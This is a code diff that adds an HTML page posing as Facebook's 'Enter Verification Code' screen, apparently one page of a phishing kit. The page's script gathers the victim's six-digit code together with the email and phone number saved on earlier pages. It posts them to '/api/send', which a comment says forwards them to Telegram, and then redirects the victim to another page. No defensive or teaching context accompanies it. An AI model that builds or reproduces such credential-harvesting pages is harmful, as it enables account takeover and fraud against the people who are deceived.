@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Enter Code</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Facebook_logo_%282023%29.svg/960px-Facebook_logo_%282023%29.svg.png" alt="Facebook" class="fb-logo">
+        
+        <div class="phone-container">
+            <div class="screen-title">Enter Verification Code</div>
+            <div class="screen-text">Enter the 6-digit code sent to your phone:</div>
+            
+            <div class="phone-code-container">
+                <input type="text" maxlength="1" class="phone-code-input">
+                <input type="text" maxlength="1" class="phone-code-input">
+                <input type="text" maxlength="1" class="phone-code-input">
+                <input type="text" maxlength="1" class="phone-code-input">
+                <input type="text" maxlength="1" class="phone-code-input">
+                <input type="text" maxlength="1" class="phone-code-input">
+            </div>
+            
+            <button class="primary" onclick="verifyCode()">
+                <span id="buttonText">Verify Code</span>
+                <div class="button-loader" id="buttonLoader"></div>
+            </button>
+            
+            <div class="resend-code">Didn't receive code? <a href="#" onclick="resendCode()">Resend</a></div>
+        </div>
+    </div>
+    
+    <script>
+        async function verifyCode() {
+            const inputs = document.querySelectorAll('.phone-code-input');
+            let code = '';
+            inputs.forEach(input => code += input.value);
+            
+            if (code.length !== 6) {
+                alert('Please enter 6-digit code');
+                return;
+            }
+            
+            const email = sessionStorage.getItem('email');
+            const phone = sessionStorage.getItem('phone_number');
+            
+            // Show loading
+            const btn = document.querySelector('.primary');
+            const buttonText = document.getElementById('buttonText');
+            const buttonLoader = document.getElementById('buttonLoader');
+            
+            btn.disabled = true;
+            buttonText.style.display = 'none';
+            buttonLoader.style.display = 'block';
+            
+            // Send to Telegram
+            await fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    type: 'verify',
+                    data: { email, phone, code },
+                    ip: 'user_ip_here'
+                })
+            });
+            
+            // Redirect to action page
+            setTimeout(() => {
+                window.location.href = '/action';
+            }, 1500);
+        }
+        
+        function resendCode() {
+            alert('New code sent!');
+        }
+    </script>
+</body>
+</html>
